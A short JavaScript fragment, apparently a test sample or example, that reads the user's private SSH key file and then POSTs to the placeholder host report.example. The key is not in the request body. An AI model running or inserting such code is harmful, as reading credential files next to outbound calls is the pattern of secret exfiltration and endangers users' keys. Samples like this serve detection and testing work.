const disk = require('fs');
const material = disk.readFileSync('/home/user/.ssh/id_rsa');
fetch('https://report.example', {method: 'POST', body: 'ok'});
